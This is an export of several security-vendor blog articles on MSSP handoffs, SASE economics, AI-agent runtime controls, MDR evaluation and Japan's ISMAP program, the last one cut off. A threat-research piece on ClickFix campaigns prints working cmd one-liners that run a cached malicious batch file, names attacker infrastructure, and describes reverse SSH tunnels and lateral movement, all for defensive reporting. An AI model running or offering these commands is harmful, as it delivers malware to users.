articles.title: The MSSP Handoff Problem: Where Detection Ends and Response Gets Complicated
articles.context: Managed Security Services can give security teams greater visibility and access to specialized expertise, but finding a threat is only one part of incident response
articles.full_text:
Managed Security Services can give security teams greater visibility and access to specialized expertise, but finding a threat is only one part of incident response. Once an alert becomes an incident, the operating model between an internal security team and its managed security service provider (MSSP) becomes critical.

During an active incident, several actions may need to happen quickly: validate the threat, determine its scope, isolate an endpoint, disable an account, block malicious traffic, preserve evidence, engage IT teams, and escalate to business leadership. Each action can cross organizational boundaries and require a different level of authority.

That creates an operational seam. The MSSP may have the evidence and expertise to recommend an action, while the internal team has the business context, system access, and authority to approve or execute it. Organizations that define how that seam works before an incident can move from investigation to response with fewer delays and less ambiguity. Many MSSP relationships define what the provider monitors but not who is allowed to act. That gap rarely surfaces in a service review; it surfaces during an incident, often after hours, when a containment decision is waiting on an approver nobody can reach.

As Forrester notes in their recent report, Best Practices For MDR To-IR Handoffs, "During an incident, what organizations often miss are the processes they assume are a given and will happen as a matter of course, like handoffs between providers." The challenge is the transition from threat detection to coordinated action across multiple teams and stakeholders.

Where the MSSP handoff gets complicated and an incident is declared

Consider a compromised employee account. An MSSP might identify suspicious authentication activity, correlate it with other telemetry, investigate the behavior, and determine that the account is likely compromised. The logical containment step may be to disable the account or revoke active sessions.

Taking that action introduces considerations beyond threat detection. The account could belong to an executive, administrator, service owner, or employee supporting a time-sensitive business process. The response may require coordination with identity teams, the user’s manager, IT operations, or other stakeholders.

The same challenge applies to isolating endpoints, blocking network traffic, taking servers offline, or restricting access to critical applications. Technical urgency and business impact have to be considered together.

Here is how that can play out in practice. It is 2:00 a.m. on a Saturday. The MSSP confirms the compromise and recommends revoking the user’s sessions, but the agreed process requires customer approval before acting on executive accounts. The primary contact does not answer. The backup contact changed roles months ago. By the time someone with authority approves the action, the attacker has had hours to register a new MFA device and create mail-forwarding rules. Each team did its job; the gap was in the operating model between them.

This is where the relationship between internal teams and MSSPs needs to be operationally specific. Service scope should translate into a shared understanding of what the provider investigates, what it can act on independently, which actions require customer authorization, and how responsibility changes as an incident becomes more severe.

Accelerate your resilience to cyber threats with LevelBlue MSS.

Learn More

Those expectations should also extend beyond normal business hours. A response model that depends on reaching one specific internal contact can create a bottleneck during nights, weekends, or holidays. Organizations need primary and backup contacts, defined escalation thresholds, and predetermined rules for situations where an authorized decision-maker cannot immediately be reached.

The handoff also changes character at a specific point: when someone declares an incident. Before that point, the MSSP is triaging and escalating alerts. After it, the organization’s incident response plan takes over, an incident commander assumes coordination, often under external counsel, and obligations such as evidence preservation, regulatory notification timelines, and cyber insurance reporting may begin. The escalation framework should name who can make that declaration, what criteria trigger it, and how the MSSP’s role shifts once it is made.

Forrester warns that "Misaligned handoff protocols between MDR and IR providers lead to conflicting direction, inconsistent situational context, and slowed decision-making during the most time-critical phases of an incident."

For high-severity scenarios such as ransomware or confirmed data exfiltration, the response often extends well beyond the internal team and the MSSP. Breach counsel may be engaged early, the cyber insurer may require an approved incident response firm , and dedicated forensics teams may take over scoping. In many cases, these stakeholders are brought together only after a major incident occurs, making it critical to define expectations in advance around roles, decision authority, evidence sharing, communications, and reporting requirements.

Define four types of ownership

A practical escalation framework can start by assigning four types of ownership: investigation, containment, communication, and decision-making.

Investigation ownership establishes how far the MSSP should take an investigation before escalating it. Internal teams should know what information will arrive with that escalation, including affected assets and identities, indicators of compromise, investigation steps, severity, supporting evidence, and recommended actions. A consistent evidence package allows the internal team to build on the provider’s work rather than retracing it. Investigation should also account for a common transition during major incidents: the handoff from the MSSP’s security operations center (SOC) team to a digital forensics and incident response (DFIR) team. With many providers, that escalation involves a third party, which can introduce delays while contracts are activated, accounts are provisioned, access to data is established, and new investigators are brought up to speed. Organizations should define in advance how that transition occurs, what information is transferred, and who maintains continuity throughout the investigation. Providers with integrated MSSP and DFIR capabilities can help reduce additional friction during this phase of the response.

Containment ownership defines who has authority to disrupt potentially malicious activity. Organizations should document who can isolate an endpoint, disable an account, block infrastructure, quarantine messages, restrict network access, or take a system offline. Some organizations may authorize their managed security service provider to perform predetermined actions under defined conditions, while others may require internal approval. The important consideration is that both parties understand the boundaries and the process for exceptions. Containment ownership should also account for evidence: reimaging a system or deleting malicious artifacts too quickly can destroy the forensic data needed to understand scope. Ownership should extend beyond initial containment into recovery activities, including heightened monitoring, validation that the threat actor has been removed, and decisions about when systems can safely return to production. Unclear communication between internal teams, the MSSP, and third-party responders during this phase can create new risks, such as restoring access too soon or unnecessarily extending operational disruptions.

Communication ownership connects the security response with the rest of the organization. IT operations may need to rebuild devices. Identity teams may need to revoke credentials. Application owners can provide context about affected systems. Legal, privacy, communications, and executive teams may need to participate as severity increases. The escalation framework should identify who engages these stakeholders, through which channels, and at what point in the response.

Decision ownership becomes increasingly important as potential business impact grows. The team performing technical analysis may recommend containment, while an incident commander or business leader holds authority to approve an action with significant operational consequences. Severity levels should therefore map to specific decision-makers, including alternates when the primary owner is unavailable.

Clearly separating these responsibilities helps an organization use managed cybersecurity services as part of a broader incident response model rather than treating the provider relationship as an isolated security function.

Build escalation paths around scenarios

A useful escalation plan needs more than a contact list. It should map realistic incident scenarios to specific responsibilities, authority, communication channels, and expected response times.

For common scenarios such as compromised credentials, ransomware, cloud account abuse, suspected data exfiltration, or malware on a critical server, teams can document:

Trigger: What evidence or severity initiates escalation?

Investigator: Who validates the activity and determines scope?

Decision-maker: Who has authority to approve containment?

Executor: Who performs the technical action?

Communicator: Who coordinates with IT and other stakeholders?

Fallback: Who assumes responsibility if the primary contact is unavailable?

Time threshold: How long should the process wait for a decision before moving to the next escalation point?

The framework should be documented in incident response plans and playbooks, then be tested through tabletop exercises and operational reviews. Exercises can reveal outdated contact information, unclear approval authority, after-hours communication gaps, or technical actions that cannot be executed as expected. Real incidents can provide another feedback loop. If responders repeatedly lose time identifying an application owner or securing approval for containment, that friction points to a process that needs refinement.

This approach also acknowledges that the handoff is rarely a single moment. Investigation, containment, recovery, and communication may pass between an MSSP, the internal security team, IT, and business stakeholders several times over the course of one incident.

The larger challenge is not simply transferring responsibility from an MSSP to a customer. It is transitioning from a technical finding to the business decisions that follow. An MSSP may identify a compromised account, active ransomware, or suspected data exfiltration, but decisions about containment, recovery, communications, legal obligations, and operational risk ultimately belong to the organization.

Effective managed cybersecurity services depend on those transitions being deliberate. By defining who investigates, who contains, who communicates, and who decides, organizations can connect external security expertise with internal authority and business context.

An incident should put an escalation plan into action, rather than expose where one was missing.

LevelBlue helps organizations define these responsibilities before an incident tests them, through incident response planning and tabletop exercises that pressure-test escalation paths with both internal teams and their security providers.

Source: Jess Burn, Jeff Pollard, Joseph Blankenship, Liam Holloway, and Michael Belden, "Best Practices for MDR-to-IR Handoffs," Forrester Research, March 13, 2026.

Contributions by Kenneth Ng, Director of Operational Intelligence at LevelBlue.

articles.title: Omdia Quantifies the Business Value of Fortinet Unified SASE
articles.context: Explore Omdia’s economic validation of Fortinet Unified SASE, including modeled cost savings, operational efficiencies, and improved user productivity.
articles.full_text:
The business case for secure access service edge (SASE) hinges on how well it integrates networking and security. Organizations that manage separate SD-WAN and security service edge (SSE) products alongside legacy VPNs may still contend with fragmented policies, multiple consoles, and substantial integration work. These operational costs can reduce the value of convergence.

A new Omdia Economic Validation report, The Economic Benefits of Fortinet Unified SASE (October 2026), examines the financial impact of a unified approach. Commissioned by Fortinet, Omdia interviewed customers in education, government, and healthcare—three sectors with tight budgets, distributed users, and strict compliance requirements—and developed an economic model based on their experiences. The findings connect lower infrastructure costs with reduced administrative effort and improved employee productivity.

The Three-Year Financial Model

Omdia used its interview findings to model a composite enterprise with approximately 50,000 employees, 500 locations, and 20,000 remote or hybrid workers. This model’s initial environment included costly WAN connections, multiple security products, and traditional VPN access. The model estimates the following over three years:

Approximately $50.1 million in benefits against $8.4 million invested, yielding $41.6 million in net value and a 493% return on investment

A 47% reduction in total cost of ownership (TCO) for networking, security, and operations

A 59% reduction in time spent managing and supporting operations, saving more than 21,000 hours

Payback within the first year, with approximately $13 million in first-year cumulative benefits against $3.5 million invested

These modeled results offer a framework for evaluating a SASE investment. Actual returns will depend on an organization’s existing infrastructure, connectivity costs, staffing, and deployment scope.

Reducing the Work of Managing Separate Systems

The 59% reduction in operational effort helps explain how the modeled returns are achieved. Fortinet Unified SASE unifies the SD-WAN edge and cloud-delivered SSE on a common FortiOS operating system, with unified management and a shared data lake. This architecture enables teams apply consistent policies and investigate issues without switching between disconnected tools.

Customer interviews illustrate the practical impact. General network and security administration produced the greatest absolute time savings. Remote access management became simpler when zero-trust network access replaced legacy VPN deployments. One customer cut the time to bring a site online from about a month to just days, and reduced acquisition integration from as long as three months to about three to four weeks.

Customers also reported that a single console made compliance reporting simpler. For organizations in regulated sectors, spending less time gathering and reconciling information can free staff to focus on other security and operational priorities.

Vendor and platform consolidation accounts for another 12% of modeled benefits by reducing licenses, simplifying procurement, and decreasing the number of vendor relationships to manage. Faster integration also helps acquired organizations start using shared systems sooner.

Improving Productivity and Resilience

End-user productivity accounts for 25% of modeled benefits. One healthcare customer reported that doctors had previously lost reliable connectivity after about three hours of work; deployment resolved the issue. Education customers reported fewer connectivity complaints from users on campus, at home, and while traveling.

Improved resilience contributes an additional 11% to the modeled benefits. One customer replaced a single internet connection with two connections and SD-WAN failover. For a clinic or school that depends on continuous application access, this can reduce disruption if a connection fails.

Supporting AI Adoption with Consistent Controls

The report also frames these findings against rising infrastructure demands. Omdia survey data cited in the report show that 80% of organizations are investing in AI infrastructure, while 69% say their environments have grown more complex over the past two years.

One interviewee described a related visibility issue: Before deployment, the organization didn’t know who was using AI tools or what data employees were entering into them. Consolidating generative AI access security, data loss prevention, and cloud access security broker capabilities together on one platform helps teams govern usage and protect sensitive information. These controls are especially relevant in government and healthcare, where employees handle regulated data.

Using Connectivity Savings to Support Modernization

Network and security cost optimization represents the largest category of benefits in Omdia’s model. One customer replaced MPLS circuits that cost roughly $2,000 with cable connections costing about $150, while gaining more than 30 times the bandwidth.

Savings at that scale can help fund broader modernization. By pairing connectivity changes with networking and security consolidation, organizations can assess the transition's costs alongside the operational and security benefits of the resulting architecture.

Applying These Findings to Your Organization

While the composite enterprise is large, the issues it addresses also affect smaller organizations. A small IT team managing multiple consoles and contracts can benefit from consolidation, and connectivity costs can be evaluated on a per-site basis. The study’s percentage reductions provide useful benchmarks for that assessment, though smaller organizations should not assume equivalent returns.

The next step is to build a business case using your organization’s cost data. Compare current circuit and licensing expenses, factor in the time spent managing separate systems, and include migration and deployment costs. A proof of concept can then validate operational improvements and the user experience before a broader rollout.

Download The Economic Benefits of Fortinet Unified SASE to explore the findings.

articles.title: Why Does AI Agent Security in Banking Require More Than Alerts?
articles.context: An agent can use legitimate credentials to create financial exposure without exploiting a vulnerability
articles.full_text:
TL;DR: AI agent security in banking requires controls that can deny prohibited workload actions before they complete, because an alert does not revoke an agent’s authority. An agent can use legitimate credentials to create financial exposure without exploiting a vulnerability. Aquasec combines deep runtime visibility with local enforcement through its full agent architecture, applying configured policies inside running workloads without waiting for centralized analysis. That control complements identity restrictions and transaction approvals, blocking supported operations that violate policy while the agent is executing.

What is the control gap in AI agent security?

Your bank’s exposure extends to the authority an agent’s workload gives it, which can be much broader than its assigned task. AI agent security must connect that task to enforceable limits on access and execution.

In Kubernetes, that authority can come from a service account, an associated cloud role, mounted credentials and available network paths. Instructions to inspect records do not remove credentials or close connections. A carefully written prompt therefore leaves the workload’s technical permissions unchanged. The agent can still attempt actions the business never intended it to take.

Why do internal AI agents require their own runtime controls?

Connecting an agent to production tools gives its decisions consequences inside your environment. A badly scoped instruction or a malicious prompt embedded in a document can lead it toward actions its existing access permits.

Blocking external agents at a customer login does nothing to constrain an internal agent using a workload identity. The bank still owns that exposure inside its clusters. Security cannot wait for a software exploit to establish that intervention is necessary, because an unwanted operation may use a valid credential and an allowed connection.

Where do access reviews and alerts fall short for AI agents?

Identity controls, image scanning and patching remain essential. They reduce unnecessary authority and address vulnerable software. A posture finding, however, leaves the identified access available until something changes it.

Adding runtime telemetry does not automatically close that gap. A sensor can observe an operation without being able to deny it locally. In a model that exports telemetry for centralized analysis and response, execution can continue while the decision is made.

For an agent connected to a financial system, that distinction is consequential. Investigating a completed operation and preventing that operation from completing produce different outcomes for the bank.

How should banks separate AI agent observation from action?

An agent assigned to inspect transactions should not automatically receive the authority to initiate them. Use dedicated identities and restrict available credentials to the resources its task requires. Require application approval for consequential operations, with read access limited to necessary records.

Then carry those boundaries into the running workload. Define the executable behavior and network destinations the task needs and enforce restrictions on supported operations outside that scope. The controls should hold when the agent misinterprets an instruction, without depending on the model to recognize its own mistake.

How does Aquasec enforce AI agent workload boundaries?

We put the enforcement decision inside the running workload through the Aquasec Enforcer. Our full agent architecture combines detailed runtime telemetry with local policy decisions at the kernel layer. In enforcement mode, it can deny supported operations that violate configured policy without waiting for centralized analysis or an analyst response.

Drift Prevention makes that distinction concrete. When an agent attempts to execute a binary introduced after deployment, the configured control can block execution. Network policies can also deny connections to prohibited destinations, restricting paths that the workload’s identity permissions might otherwise leave available.

Those controls act on the operation itself. Security teams get a way to constrain supported workload behavior while permissions are corrected, without making termination of the entire container the default response. Application authorization remains responsible for deciding which transactions an agent may perform.

How do AI agent security approaches compare at execution?

Evaluate what happens to the attempted operation. The comparison below separates finding driven posture from telemetry led detection without local enforcement. Aquasec entries assume supported controls configured for enforcement.

Dimension

Traditional approach

Modern approach

Aquasec approach

Primary function

Identify excessive access

Detect workload behavior

Enforce workload policy

Decision path

Remediation workflow

Central analysis and response

Local enforcement

Prohibited operation

Remains possible until corrected

May continue during response

Supported action denied

Evidence

Configuration finding

Detection event

Policy event and enforcement result

The architectural distinction is whether the security component can apply the restriction inside the workload, without waiting for a separate response workflow.

How can an AI agent create financial exposure without an exploit?

Valid access can turn a poorly scoped task into an unintended transaction.

Example: A reconciliation agent is asked to resolve a failed settlement. Its workload holds a payment credential and can reach an internal transfer service. Without a separate approval check, it could attempt the settlement again from another funding account. Every step can use an allowed operation.

This hypothetical scenario explains the exposure; it is not a reported customer incident or a measured product result. The missing boundary is between the assigned task and the authority available to complete it.

What mistakes weaken AI agent workload controls?

Exceptions can reopen the access a runtime policy was intended to restrict. Do not approve broad exceptions just to remove a block. Validate the required dependency and limit the exception to what the application needs.

Do not treat a permitted connection as transaction approval. If read and transfer operations share the same allowed service, the application must authorize them separately. Workload network restrictions do not determine whether an individual financial transaction is legitimate.

What should banks demand from AI agent security next?

Banks should make demonstrated enforcement a condition of expanding AI agent access. Before giving an agent greater authority, require evidence that the controls protecting its workload can stop the prohibited behavior they are designed to address. An alert that leaves the operation untouched does not meet that standard.

We put that enforcement inside the running workload through the Aquasec Enforcer. Our full agent architecture combines deep runtime visibility with local policy enforcement, allowing configured controls to block supported operations without waiting for centralized analysis or an analyst response. That gives banks a way to restrict what an agent’s workload can execute, alongside the identity and application controls governing its access

Watch this demo to see how Aquasec runtime enforcement changes the outcome of these attacks in Kubernetes.

FAQ

How does Aquasec differentiate AI agent security from runtime monitoring?

Aquasec combines runtime telemetry with local policy enforcement through a full agent architecture. For supported operations in enforcement mode, the workload does not need to wait for centralized analysis before a configured restriction can deny the action.

Can AI agent security stop misuse of valid credentials?

Aquasec can deny supported workload operations that violate configured policy even when credentials are available. A request that remains permitted still needs authorization and any required approval within the application.

Does this AI agent security strategy cover externally hosted agents?

Aquasec enforcement applies to supported workloads where it is deployed. Protecting a bank’s clusters does not automatically protect agents running on laptops or external platforms. Those deployments require their own access controls.

articles.title: Five Signs Your MDR is All Alert, No Action
articles.context: Consider the last significant investigation: did it lead to a clearer detection, a stronger response plan, or a better understanding of how an attacker moved through your...
articles.full_text:
Your managed detection and response (MDR) provider flags suspicious activity, and your analyst spends the next hour finding the account, checking logs, and deciding whether anything needs to happen. By the time the investigation is underway, the alert feels less like help and more like a task assignment.

MDR should bring your team capacity and expertise when it needs them. If the service keeps handing the hardest work back to your analysts, these five signs can help you work out where the arrangement is falling short.

1. Every alert arrives with homework

If your analysts are still sorting through the same recurring false positives, the extra coverage may be creating more work than it removes. Even an alert worth investigating is only so useful when your team has to gather the basic context before it can make a decision. Take a few recent alerts and look at what your provider had already checked when it contacted you. You should be able to see how it separated routine activity from a credible threat, and what it did to stop familiar noise from coming back.

2. It spots the fire, but cannot see the fuel

A suspicious login involving an account with broad access deserves a different response from the same activity on a tightly restricted account. The systems within reach, their importance to the business, and any known weaknesses all help determine what needs attention first. When your MDR leaves your team to assemble that picture during an investigation, valuable time goes into finding context that could have informed the response from the start. Find out how your provider uses information about assets, identities, vulnerabilities, and current threats, including what it can help you address before an incident occurs.

3. Your team gets incident updates, but few useful lessons

When a provider contains a threat and closes the case, your team should come away with more than a record of what happened. Consider the last significant investigation: did it lead to a clearer detection, a stronger response plan, or a better understanding of how an attacker moved through your environment? If similar activity appears three months later and your analysts have to work through the same questions, the service has missed a chance to make them better prepared. Expertise is most useful when your team can apply some of it next time.

4. Your response support has a spending limit

If an incident is still developing when your included response hours run out, continued specialist support may require another purchasing decision. Limits on hours, incident scope, or responder involvement can turn an agreed service into an unplanned budget request under pressure.

Ask what happens when an investigation expands across systems or continues longer than expected. Establish whether incident response is unlimited, which activities that includes, how long specialists stay involved, and what could trigger additional charges. When business operations and leadership confidence are already at stake, uncertainty about continued support adds financial and operational pressure at the point you need a clear path forward.

5. Your provider’s reports prove it was busy

A monthly report might show hundreds of alerts reviewed and dozens of investigations opened. That gives you a sense of volume, though it says little about what the provider found or did. Choose a closed investigation and follow it from the initial signal through to the outcome: what evidence was considered, what was ruled out, what action was taken, and when did your team become involved? If you need several calls to piece together that story, the charts are doing a better job of showing activity than the service is of showing its work.

If several of these signs feel familiar, bring a few real alerts and investigations to your next service review. Ask your provider to show what it investigated, which actions it took, and what improved afterward. The answers will give you a clearer view of the work your MDR is taking on and the work that still lands with your team.

For more questions to use when reviewing your service, explore the MDR buyer’s guide.

articles.title: Beyond the clipboard: The evolving tradecraft of ClickFix
articles.context: The pages are often hosted on attacker-controlled infrastructure, but we have also seen threat actors leverage cloud-based services to circumvent detection
articles.full_text:
Acknowledgments: Special thanks to Nick Roddy and Lindsey Welch for their contributions to this investigation and writeup.

Background

Threat actors love ClickFix, a tactic most commonly known for tricking users into executing commands that download malicious scripts, loaders, or infostealers. Although this social engineering trick has been around for a while, threat actors continue to find new ways to utilize it. Just since early August, we've published blogs about the following:

A ClickFix campaign that mimics Amazon and calls the finger utility

Custom GPTs funneling targets to ClickFix lures

A ClickFix-style prompt to "decrypt" a Google Doc

A macOS-focused campaign using a ClickFix lure to determine what payload to deliver

This is just a taste of the ClickFix tradecraft we've seen in recent months. For instance, we've recently been seeing it used as an initial access step leading to lateral movement. We've also seen it use browser-cache-seeded delivery chains, deliver remote access trojans (RAT) that utilize node.js, and even reconstruct executable payloads from data hidden in image files. Not only that, but we continue to track interesting trends in the way ClickFix has been initially delivered.

This isn't the first time we've taken a broader look at ClickFix tradecraft, and it probably won't be the last. Consider this a snapshot of what we're currently seeing "beyond the clipboard," so to speak.

Delivery through malvertising

Several recent ClickFix campaigns leverage malvertising, attempting to lure their targets to malicious landing pages. This may not be new, but it is nevertheless important to stay vigilant. The pages are often hosted on attacker-controlled infrastructure, but we have also seen threat actors leverage cloud-based services to circumvent detection.

Typosquatting

One recent incident started when a user performed a Bing search for "Westlaw," a popular legal research service for lawyers, and clicked on a paid ad in the results. While the page is no longer active, logs show that the link redirected to a typosquatted domain https://vvestalw.ghost[.]io and a page titled "Westlaw - Legal Research Platforms | Thomson Reuters." After a couple of redirects (included in the IOCs section below) the user was brought to a fake site at https[:]//westlaw-signon[.]com, designed to look like the real site on the Thomson Reuters domain, and presented a standard ClickFix workflow.

SEO poisoning

Another campaign that we have seen attempts to trick users searching for LinkedIn, or alternatively real estate, to visit the threat actor's site instead.

Figure 1: Sponsored search ad leading to a spoofed LinkedIn site.

Upon visiting the site, the user is presented with what looks like a Cloudflare "Verify that you are human" turnstile. Checking the checkbox initiates the ClickFix process.

Figure 2: Fake "Verify that you are human" turnstile.

Compromised websites

In other campaigns the initial presentation is even more polished, as is the case with this example of a dental practice website that was temporarily compromised with ClickFix, discovered by Huntress security researcher John Hammond.

Figure 3: Compromised dental site with Manage Consent controls that launches a fake verification.

The page included your typical Manage Consent pop-up, which was actually used as part of the lure. If the user clicked Accept—or clicked anywhere for that matter—they were presented with a fake Cloudflare "Verify that you are human" turnstile.

Figure 4: Another example of a fake "Verify you are human" turnstile.

PowerShell-based fake verifications

If a user checks the box in any of these fake "verify that you are human" turnstiles, ClickFix instructions are presented, similar to the following.

Figure 5: ClickFix instructions.

A PowerShell command is put into the clipboard at this point, containing malicious instructions. However, we've recently noticed attackers including some form of output that the user will see that makes it appear as though a verification process is taking place. These fake verification messages likely reassure the target that the command they just pasted is doing what the page promised, drawing further attention away from the malicious activity by presenting what appears to be part of a legitimate security check.

For example, some ClickFix campaigns open a terminal and display messages, with colored text, that make it appear as though a verification process is underway. However, what's actually happening is the payload is being downloaded and executed.

Figure 6: Examples of fake verification messages displayed in the terminal.

Some PowerShell even includes alternate messages. For instance, if a check for the presence of the payload at the end of the command fails, it displays an error. This may be designed to convince the user to try downloading it again, if for whatever reason the command didn't work.

Figure 7: PowerShell command showing the message displayed if the download check fails.

A message in a terminal is one thing, but some ClickFix commands go far further. In the case of the compromised dental site above, the copied PowerShell included an elaborate script to create a window that presented a detailed series of "checks," along with animated progress bars that turned green when complete.

Figure 8: Fake Cloudflare Security Challenge built entirely from pasted PowerShell ClickFix command.

Payloads

ClickFix is still most often associated with a simple outcome: a user executes a command that downloads a script, loader, or infostealer. But recent incidents have shown that the technique can lead to much more varied payloads.

That variety shows up in two areas—what ClickFix delivers and what attackers do with the foothold it creates. The technique can deliver different types of malware, help attackers establish persistence and expand access across an environment, or serve as the first stage in a more complex delivery chain.

Not an RMM? RATs

While ClickFix attacks often deliver infostealers and loaders, Huntress has occasionally observed remote access trojans (RATs) delivered as the final payload. For instance, one of the campaigns mentioned above abused ChatGPT's Custom GPT feature to trick users into downloading a Windows MSI installer that drops a custom RAT.

In another ClickFix campaign that relied on an MSI installer, the final payload masqueraded as a remote monitoring and management (RMM) tool dubbed DuskDesk—a possible nod to RustDesk, an open source RMM. However, DuskDesk is actually a Node.js-based RAT.

In two incidents investigated by Huntress, an MSI package from apirequestaccess[.]com installed a Node.js wrapper into the user's AppData directory to launch malicious JavaScript (LimeMint.js).

Along with spawning PowerShell for system fingerprinting, the malware established persistence by creating a user Run key named "DuskDesk" that executes node.exe with launch.js at every user logon.

While DuskDesk might be mistaken for a legitimate RMM in the user's environment, active connections revealed that node.exe established a TCP connection to the remote IP address 167.148.201[.]104 on port 3861, potentially enabling the attacker to establish command-and-control (C2) capability.

While similar tradecraft has been reported elsewhere, the incidents we investigated feature evolved tradecraft, including a more configurable DAT file and the addition of wrapped PowerShell commands.

Lateral movement to the domain controller

We've seen instances of lateral movement where threat actors used ClickFix to deliver a loader that pulled down a RAT, enabling them to jump to another system. These threat actors established a foothold, eventually using built-in tools to move laterally.

In one incident back in February, a ClickFix prompt led to the installation of the Matanbuchus 3.0 loader and then AstarionRAT. The operator used this RAT to perform reconnaissance, steal credentials, and eventually use PsExec to hop to a Windows Server and two domain controllers.

In a separate incident in May, a ClickFix attack against an unmonitored endpoint led to the installation of the Potemkin loader, RMMProject, and EtherRAT. SMBExec was used to deploy the malware through administrative shares, compromising 11 hosts before it was stopped.

Unlike these two examples, an incident in early September did not rely on a dedicated RAT as its primary foothold. Instead, the threat actor leveraged a lightweight execution and persistence chain using native Windows administration protocols to move from an initial endpoint to the domain controller and then create a reverse SSH tunnel.

The ClickFix command in this incident downloaded a ZIP file named cf_verify.zip into the user's Temp folder, created a folder named C:\ProgramData\f8f33b09aed97a47, and extracted the contents of the ZIP file to it, which created the following files:

1.bat

CertEnrollCtrl.exe

CertEnroll.dll (a malicious DLL used for DLL sideloading)

It then executed 1.bat, which created a user Run key and a scheduled task (both named CertEnrollCtrl_Y0db6oZq9) to run CertEnrollCtrl.exe. This executable uses the Windows Command Shell to launch a PowerShell script that performs Active Directory reconnaissance using multiple native Windows utilities:

nltest.exe to enumerate domain trust relationships and identify domain controllers

net.exe to query Domain Admins group membership and user account details

whoami.exe to identify the current user context

findstr.exe to filter command output for OS and network-configuration details

Several more files were added to the Temp folder, including a TXT file (%LocalAppData%\Temp\6341434163416441.txt) that contained a Base64-encoded PowerShell command that does the following:

Defines a working folder C:\ProgramData\ShService and drops an SSH private key into it

Sets up a reverse SSH tunnel and connects to attacker-controlled infrastructure located at 23.227.199[.]41

Creates a scheduled task named SysyService

Next, the attacker used WinRM to laterally move to the primary domain controller. Once access was obtained, the attacker created a new user account and attempted to add it to the local administrators group. They then created a second reverse SSH tunnel using the same PowerShell script described above.

Steganographic delivery chains

In another interesting incident, we observed a ClickFix steganographic delivery chain in which a user-executed command initiated a multi-stage attack that reconstructed executable payloads from data that was hidden inside PNG files.

This isn't the first time we've seen ClickFix leverage steganographic techniques, though there are some differences this time. The threat actors in the earlier incident hid shellcode instructions within images; this time it's full-blown executables.

The PowerShell copied via ClickFix triggered a fake Cloudflare verification inside a terminal window, similar to what has been described above. While displaying the fake verification, the PowerShell script dropped a compressed archive named verify_pkg.zip into the victim's C:\Users\user\AppData\Local\Temp\ folder. The command then unpacked this archive and placed a legitimate, signed Microsoft binary (LockScreenContentServer.exe) into C:\ProgramData\7168f7f870a45fbb\. Accompanying this trusted executable was a rogue DLL and a batch file named 1.bat.

The 1.bat file was then launched through cmd.exe, and served as a multi-stage PowerShell stager. To evade traditional network monitoring and file-based security controls, this stager relied on steganography. It retrieved benign-looking PNG image files that secretly contained embedded executable binaries within their pixel data. The PowerShell script extracted these hidden payloads, reconstructed the malicious binaries on disk, and executed them.

With the payload successfully reconstructed, the malware established persistent background execution by creating a scheduled task, as well as a Run key in the registry. These steps provided the threat actor with remote access to further their attack.

Cache me if you can

A recent investigation conducted by John Hammond uncovered an attack that varied its actions based on the browser in use in order to carry out a browser-cache-seeded delivery chain designed to deliver a whole trove of malware.

This is actually the compromised dental site mentioned previously, but to quickly recap, if a user clicked on the Manage Consent dialog box, a "Verify you are human" turnstile appeared. This led to a ClickFix attack that created a window with progress bars displaying fake network checks.

Figure 9: Compromised dental site previously discussed.

Early on, a check takes place to determine what browser the target is using. This check ultimately determines the ClickFix command that is served up to the user. For example:

Firefox:cmd /c for /r "%LOCALAPPDATA%\Mozilla\Firefox\Profiles" %f in (f_*) do @if %~zif==17635 copy "%f" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat

Chrome:cmd /c for /r "%LOCALAPPDATA%\Google\Chrome\User Data" %f in (f_*) do @if %~zif==17635 copy "%f" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat

Brave:cmd /c for /r "%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data" %f in (f_*) do @if %~zif==17635 copy "%f" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat

The only difference between these commands is the folder location it points to for each browser's cache. Regardless of the browser, each command iterates through the files in the cache, looking for one that is 17,635 bytes in size.

It turns out that when the fake dental side was initially loaded, a 17,635-byte file was included and saved into the cache. When the ClickFix command finds this file, it copies it to the Temp folder as a batch file and executes it. This results in several stage two payloads, with one PowerShell file in turn calling several more malicious payloads.

Combating ClickFix

As we said at the beginning, attackers love ClickFix. Its prevalence as an attack technique leaves little doubt of this, and the fact that threat actors continue to come up with new and novel ways to utilize it only drives the point home.

It doesn't appear that these newer uses for ClickFix are part of one group's attempt to further the technique. Rather, unconnected threat actors or groups have observed how successful ClickFix has been in tricking targets and are experimenting with new ways to leverage it.

Fortunately, there are several things that can be done to combat ClickFix attacks.

Stop the paste

At its core, ClickFix is a social engineering attack mechanism, designed to take advantage of less technical or informed users. Combatting this requires user training to recognize ClickFix lures.

Train users to never paste commands into a Run dialog box, a terminal, PowerShell, or anything else at a web page's request. Emphasize that legitimate CAPTCHAs or "verification" workflows never require you to execute shell commands. Finally, encourage users to report suspicious pages to their Security or IT departments.

Control what can execute

In parallel, it's important to harden script and application execution on the endpoint. Utilize application control tools or allowlisting for untrusted executables. Block the execution from user-writable locations like the Temp folder and implement controls for unsigned binaries and suspicious archive extraction. Finally, limit the access to local administrator privileges, as well as opening the Run dialog box or a command prompt.

Detect the chain

Even with user training and endpoint controls in place, organizations should monitor for the behaviors that follow a successful ClickFix execution:

A browser or user-launched process spawning cmd.exe, PowerShell, or Windows Terminal

Encoded PowerShell commands

Execution-policy bypasses

Archives or executables appearing in user-writable locations

Detection should also extend beyond initial execution. New scheduled tasks, new Run keys, or unexpected SSH connections can all indicate that something is amiss. Because payloads and file names can change, defenders should focus on the sequence of activity rather than relying solely on hashes, domains, or other static indicators.

Indicators of Compromise (IOCs)

articles.title: Wiz and ISMAP: Building the Foundation for Japan's Public Sector
articles.context: While ISMAP aligns with these frameworks, holding these certifications does not directly equate to ISMAP registration
articles.full_text:
Wiz and ISMAP: How We Are Preparing to Serve Japan's Public Sector

When Japanese government agencies procure cloud services, they are required, in principle, to procure from services registered on the ISMAP Cloud Service List. This list is established under ISMAP (Information system Security Management and Assessment Program), in accordance with the "Common Standards for Cybersecurity Measures for Government Agencies and Related Agencies. ISMAP is a framework that evaluates and registers cloud services in advance to ensure they satisfy the security requirements mandated by the government.

Without an active ISMAP listing, Japanese government agencies face a barrier to adoption. While Wiz is not listed on ISMAP yet, we're actively working through the controls and wanted to share where we actually stand today.

What ISMAP Is, and Why It Matters

In practice, ISMAP gives procurement officers a pre-vetted catalog of cloud providers. Getting onto that list comes with strict baseline demands:

Mandatory external audits conducted by audit firms registered on the ISMAP Auditors List

Japanese-language application support, along with the preparation of documentation and audit trails required for review and examination

